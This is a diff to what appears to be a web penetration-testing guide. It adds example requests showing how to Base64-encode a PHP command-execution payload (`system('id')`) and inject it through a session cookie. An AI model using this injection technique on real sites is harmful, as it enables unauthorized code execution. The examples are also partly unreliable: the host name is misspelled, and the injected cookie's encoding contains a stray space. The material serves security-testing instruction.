@@ -95,10 +95,36 @@ Log into the target site and intercept requests using Burp Suite
 
 {% step %}
 Intercept a simple request and check if the Cookie parameter is Base64 encoded
+
+```http
+GET /dashboard HTTP/1.1
+Host: exmaple.com
+Cookie: session=VXNlcj10ZXN0dXNlcg==
+```
 {% endstep %}
 
 {% step %}
-Delete the cookie value and then Base64 encode a malicious code based on the language written and insert it into the cookie
+Delete the cookie value and then Base64 encode a malicious code based on the language written and insert it into the cookie, Payload before encoding
+
+```php
+<?php system('id'); ?>
+```
+
+Payload after Base64 Encode\\
+
+```
+PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg==
+```
+{% endstep %}
+
+{% step %}
+Injected request
+
+```http
+GET /dashboard HTTP/1.1
+Host: example.com
+Cookie: session=PD9waHAgc3lzdGVtKCd pZCcpOyA/Pg==
+```
 {% endstep %}
 
 {% step %}
